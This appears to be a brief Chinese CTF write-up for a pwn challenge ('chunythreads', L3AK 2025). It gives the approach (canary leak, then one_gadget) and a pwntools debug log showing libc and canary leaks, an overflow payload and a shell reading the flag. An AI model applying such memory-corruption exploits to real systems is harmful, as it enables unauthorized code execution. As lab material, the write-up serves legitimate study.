
# 思路
- 泄漏canary
- one_gadget

# debug
多线程数据格式
```
seconds         4字节
count           4字节
data_ptr        8字节
data_len        8字节
```

泄漏canary和libc的时候，把second设置很大，就不会退出导致canary失败了。

# getshell
```
[DEBUG] Received 0x5f bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000050  61 61 61 61  61 61 61 61  a4 da f8 81  e6 7f 0a     │aaaa│aaaa│····│···│
    0000005f
[+] libc.address :-----> 0x7fe681ef1000
[DEBUG] Sent 0x56 bytes:
    b'CHUNK 9999 1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
/home/task/2025/07-12-L3ak/chunythreads/exp.py:39: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("\x61"*0x48)
[DEBUG] Received 0x57 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000040  61 61 61 61  61 61 61 61  0a ac 24 57  99 9e 20 25  │aaaa│aaaa│··$W│·· %│
    00000050  70 bf 6e 81  e6 7f 0a                               │p·n·│···│
    00000057
[+] cannary:-----> 0x25209e995724ac00
[DEBUG] Sent 0x6b bytes:
    00000000  43 48 55 4e  4b 20 31 20  31 20 61 61  61 61 61 61  │CHUN│K 1 │1 aa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000050  61 61 00 ac  24 57 99 9e  20 25 00 00  00 00 00 00  │aa··│$W··│ %··│····│
    00000060  00 00 ec 93  f4 81 e6 7f  00 00 0a                  │····│····│···│
    0000006b
[DEBUG] Sent 0xe bytes:
    b'cat /flag.txt\n'
[DEBUG] Sent 0xe bytes:
    b'cat /flag.txt\n'
[*] Switching to interactive mode
p\xbfn\x81\xe6\x7f
[DEBUG] Received 0x49 bytes:
    b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[DEBUG] Received 0x10 bytes:
    b'unknown command\n'
unknown command
[DEBUG] Received 0x36 bytes:
    b'L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}\n'
L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}
$
```


![](https://r2.20161023.xyz/pic/20250712193546073.png)